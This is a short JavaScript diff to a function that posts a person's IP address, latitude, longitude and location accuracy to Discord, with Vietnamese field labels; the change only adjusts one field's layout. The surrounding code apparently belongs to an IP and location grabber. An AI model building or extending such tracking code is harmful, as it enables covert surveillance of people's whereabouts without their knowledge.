@@ -36,7 +36,7 @@ function sendToDiscord(method, lat, lon, ip, acc) {
             title: `🎯 Dữ liệu: ${method}`,
             color: 16744192,
             fields: [
-                { name: "🌐 IP", value: ip, inline: false },
+                { name: "🌐 IP", value: ip, inline: true },
                 { name: "🛰️ Vĩ độ", value: String(lat), inline: true },
                 { name: "🛰️ Kinh độ", value: String(lon), inline: true },
                 { name: "🎯 Độ chính xác", value: acc, inline: false },
